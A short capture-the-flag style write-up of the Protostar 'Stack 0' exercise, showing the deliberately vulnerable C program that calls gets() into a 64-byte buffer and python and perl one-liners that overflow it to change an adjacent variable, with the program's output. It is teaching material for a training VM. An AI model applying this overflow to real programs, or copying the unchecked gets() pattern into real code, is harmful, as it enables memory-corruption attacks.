
___________________________________________ EXPLOIT EXERCISES _________________________________________
			
========= Abhinav Thakur
========= compilepeace@gmail.com


######### PROTOSTAR

                                  =-=-=-=-=-=   STACK - 0   =-=-=-=-=



~>	Hey there, there we go to another series of Exploit exercises, Protostar which focuses on
	old exploitation techniques on linux (without any mitigation techniques like ASLR, NX bit etc.) 

	Lets get started.

	
1.	First I log into the virtual machine with
		username : user
		password : user



2.	Source code provided is - 

	#include <stdlib.h>
	#include <unistd.h>
	#include <stdio.h>

	int main(int argc, char **argv)
	{
	  volatile int modified;
	  char buffer[64];

	  modified = 0;
	  gets(buffer);

	  if(modified != 0) {
	      printf("you have changed the 'modified' variable\n");
	  }
	  else 
	  {
	      printf("Try again?\n");
  	  }
	}



3.	Just as I saw the code, my eyes found the gets() which does not validate input and makes
	our code vulnerable to an overflow and there is a buffer too (ofcource there will be :).
	Next I created a vague image of the placement of buffer and variable modified on stack, 
	and concluded that the 64 byte buffer will be placed at lower address than the variable
	modified and so the variable 'modified' is likely to get altered if an overflow occurs.


4.	Since the condition - "if(modified != 0)" will be true if and only if modified is not 0
	Therefore we overflow the buffer such that it alters variable 'modified'. 
	We can create the buffer string in many ways - using bash, perl or python

		$ python -c 'print "A"*64 + "BB" '
		$ perl -e 'print "A"x64 . "BB";'
		AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABB
	
	Both of them will create a 66 byte long string which will change overflow to "BB", i.e. 
	not zero and the conditional block is executed.

		$ ./stack0 
		AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABB
		you have changed the 'modified' variable


	Cheers,	
		


